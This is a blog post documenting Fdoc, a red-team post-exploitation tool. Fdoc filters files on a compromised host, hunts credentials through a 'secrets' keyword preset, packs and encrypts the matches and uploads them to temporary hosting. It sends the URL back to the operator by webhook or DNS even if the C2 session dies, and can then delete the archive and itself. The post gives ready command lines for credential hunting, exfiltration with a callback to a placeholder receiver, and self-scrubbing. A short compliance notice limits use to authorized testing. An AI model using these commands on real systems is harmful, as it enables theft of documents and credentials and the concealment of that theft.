---
title: "Fdoc: Conditional Packing, Upload Exfil, and Callback"
date: 2026-07-21T10:25:00+08:00
draft: false
description: "Under short-lived session constraints, filter files by extension, name, keywords, and date, stream-pack them, then optionally encrypt, upload, and return the URL via webhook or DNS."
categories: ["security"]
tags: ["red-team", "post-exploitation", "fdoc", "exfiltration", "file-transfer"]
featuredImage: "/images/posts/fdoc-conditional-pack-exfil/featured.jpg"
featuredImagePreview: "/images/posts/fdoc-conditional-pack-exfil/featured.jpg"
lightgallery: true
toc:
  enable: true
  auto: true
---

When you land on a host (or only have a short-lived shell), the goal is rarely a full disk image. More often you need to filter a subset of files, pack them into a size-bounded archive, and get the result back to the operator side quickly.

<!--more-->

{{< admonition warning "Compliance notice" >}}
For authorized penetration testing, incident response, and research only. Do not use against systems you do not own or lack permission to test.
{{< /admonition >}}

## 1. Use cases

Typical needs include:

- **Type filtering**: only certain types—contracts/report PDFs, Office files, configs, archives, recently modified documents
- **Stacked conditions**: names containing password/password-book, content matching credential patterns (via `-keyword secrets`), mtime after a given day
- **Size and time limits**: cannot blindly pack tens of GB, and cannot linger on the target
- **Result callback**: packing is not enough—files stay on the target; you still need the **download URL** back on the operator side, even if the parent process/C2 dies
- **Footprint control**: after transfer, avoid leaving the archive and the tool itself on disk

A concrete playbook: **right after initial access, run a short collection pass**—filter sensitive configs, documents, spreadsheets, and source by extension/name/keyword into an archive, exfil to a local analysis box. The pack often yields network maps, password books, credential sheets, and ops manuals that support lateral movement—without slowly browsing the disk on target.

Red-team exfil, pulling key evidence in IR, or ops “only grab this directory/file class”—all are **selective exfil**, not backup, not full-disk forensics.

[Fdoc](https://github.com/simonlee-hello/Fdoc) is built for that: filter on target, pack, (optionally) upload, (optionally) callback the URL to a receiver, (optionally) scrub.

## 2. Pain points addressed

| Pain point | How Fdoc maps |
| ---------- | ------------- |
| Whole-disk/dir packs are slow and huge; useful files are a small slice | Combined extension/name/content/date filters + default `documents`; credentials via `-keyword secrets` |
| Enumerate all paths then compress—bad memory and runtime on large trees | Streaming Walk + write tgz |
| Archive sits on target; session dies and the URL is gone | webhook / DNS callback, decoupled from C2 lifetime |
| Which temp host works, and size limits differ | Size-based auto probe + failover, or pin a backend |
| Uploading plaintext archives feels unsafe | Optional encryption |
| Want fewer leftovers after transfer | Optional scrub; failures are observable (exit / `SCRUB_PARTIAL`) |
| Toolchain too fragmented (packer + uploader + decryptor) | One binary covers pack / upload / decrypt / backend list |

In one line:

**Under the constraint of “short dwell time, only some files, and still get results home,” Fdoc folds filter, pack, exfil, and callback into one scriptable command chain.**

## 3. Pipeline

Main path:

**Parse flags → Walk from `-d` → filter by rules → stream-write `.tgz` → (optional) encrypt and upload to temp hosting → (optional) webhook/DNS callback URL → (optional) scrub**

Per file, filters are a fixed AND chain (unset items pass):

Skip `-x` dirs → regular file or followable file symlink → `-e` extension → `-f` name → `-t` date → `-k`/`-keyword` content → `-max-file` → whether total hits `-max`.

Commas inside one flag are OR. Example: `-e pdf -f invoice -t 2024-01-01` requires all three; `-keyword password:,token:` matches either in content. Presets work too: `-keyword secrets` (alias `creds`) expands to assignment/JSON credential substrings. Details and preset tables: [4.1 Multi-condition filtering](#41-multi-condition-filtering).

Size and exit behavior:

- **Default soft cap**: total budget counted by logical size, default 1GB; per-file `-max-file` off by default (`0`)
- **No explicit `-max`**: hitting the budget fails immediately (exit 1) and asks you to set `-max` (or `-max 0` to disable)—avoids silent truncation
- **Explicit `-max`**: truncate and keep what was packed (exit 2); if upload is on, the partial archive may still upload—“take what you can”
- **Huge single files**: add `-max-file` explicitly when you need to skip them

{{< admonition tip "Estimate first" >}}
When match size is unclear, run `-size` first (stats only, no pack), check disk vs logical size, then decide whether to pack or add `-max`.
{{< /admonition >}}

Without `-upload`, packing stays local and offline. With it, probe, upload, and callback kick in.

## 4. Features

### 4.1 Multi-condition filtering

Narrow the set by extension, name, content, date, and skip dirs; conditions are AND across flags, OR within a comma-separated flag. Rules: [3. Pipeline](#3-pipeline).

| Condition | Flag | Notes |
| --------- | ---- | ----- |
| Extension | `-e` | Filter by extension; `pdf,docx` or presets |
| Filename | `-f` | Fuzzy path substring (e.g. `invoice,secret`) |
| Content keyword | `-k` / `-keyword` | Search file content (skip obvious binaries; ~8MB max per file). Literal commas = OR; presets `secrets`/`creds` expand to `password=`, `"password":`, etc., mixable with literals |
| mtime | `-t` | Only files modified on/after that day (`YYYY-MM-DD`) |
| Skip dirs | `-x` | Defaults include per-OS cache/junk lists; an explicit `-x` replaces the whole table |

`-e` presets:

| Value | Meaning |
| ----- | ------- |
| `documents` (default) | pdf/doc/xls/ppt/csv |
| `all` | common docs + archives + config (still not every file on disk) |
| `any` | no extension limit |
| `pdf,txt,...` | explicit list |

`-keyword` presets:

| Value | Meaning |
| ----- | ------- |
| `secrets` / `creds` | Credential assignment/JSON substrings (`password:`, `password =`, `"password":`, `api_key=`, Chinese `密码：`, etc.); e.g. `-keyword secrets,corp_sso=` |

Examples:

```bash
Fdoc -d /data -e pdf -f invoice -keyword 'token:' -t 2025-01-01 -o hits.tgz
Fdoc -d /data -e ini,conf,json,yml -keyword secrets -o creds.tgz
```

Symlinks: on Unix/macOS, **file symlinks are followed** (content from target, archive path keeps the link path); directory symlinks are not entered. Windows `.lnk` is not resolved—only the shortcut file itself is packed when `-e` matches.

### 4.2 Stream pack with size budget

No full listing then compress—memory stays bounded. Use `-size` to estimate first. Long jobs emit `PACK_PROGRESS` / `UPLOAD_PROGRESS` heartbeats for headless use.

### 4.3 Built-in upload: auto-pick temp backends by size

With `-upload`, backends are filtered by archive size, probed in parallel, and failed over by latency; pin one with `-b` (demos often use `-b lit`). Full names and size caps: `Fdoc backends`. Without callback, the URL goes to stdout for scripting; status lines on stderr (`UPLOAD_OK`, etc.).

### 4.4 Callback decoupled from the session

With `-webhook` / `-dns`, the download URL is pushed to your receiver: HTTPS webhook first, DNSLog shards on failure. If the parent session dies, you may still recover the URL from the callback. stdout/stderr roles stay fixed so scripts and humans do not fight over output.

### 4.5 Optional pre-upload encryption

`-encrypt -key`: AES-256-CBC with `UP01` magic; remote objects use `.bin` so they are not mistaken for plain gzip. Built-in `Fdoc decrypt`—no second tool. The key is a passphrase padded to 32 bytes (not PBKDF2); treat it as a shared-secret model.

### 4.6 Optional scrub

After a successful upload (and successful callback if configured), delete the archive and the binary itself. On Windows, self-delete is best-effort (delayed / reboot delete); failure yields `SCRUB_PARTIAL` and a non-zero exit.

### 4.7 Cross-platform static binary

Ships as dependency-free static singles for Linux / Windows / macOS (amd64 and arm64). Same flags across platforms; Windows scrub, SkipDirs, and `.lnk` behavior are covered above and in release notes.

## 5. Minimal examples

```bash
# Estimate size first when unsure
Fdoc -d /data -e documents -size

# Pack
Fdoc -d /data -e documents -max 500MB -o /tmp/docs.tgz

# Hunt credential patterns in config/JSON
Fdoc -d /data -e ini,conf,json,yml -keyword secrets -o /tmp/creds.tgz

# Upload; URL on stdout
Fdoc -d /data -o /tmp/docs.tgz -upload -q

# Encrypt + upload + webhook callback + scrub
Fdoc -d /data -e pdf,docx -t 2025-01-01 -o /tmp/docs.tgz \
  -upload -encrypt -key "$KEY" \
  -webhook https://your.receiver/hook \
  -scrub -q
```

DNS shard format, encryption disk use, Windows SkipDirs, and related details: see the [Fdoc README](https://github.com/simonlee-hello/Fdoc).

## 6. Terminal demos

Four clips cover the main path: size estimate → filtered pack → pinned-backend upload → upload with webhook callback.

{{< image src="/images/posts/fdoc-conditional-pack-exfil/01-size.gif" caption="Size estimate (`-size`)" >}}

{{< image src="/images/posts/fdoc-conditional-pack-exfil/02-filter-pack.gif" caption="Multi-condition filter then pack" >}}

{{< image src="/images/posts/fdoc-conditional-pack-exfil/03-upload.gif" caption="Upload (`-b lit`)" >}}

{{< image src="/images/posts/fdoc-conditional-pack-exfil/04-upload-webhook.gif" caption="Upload + webhook callback" >}}
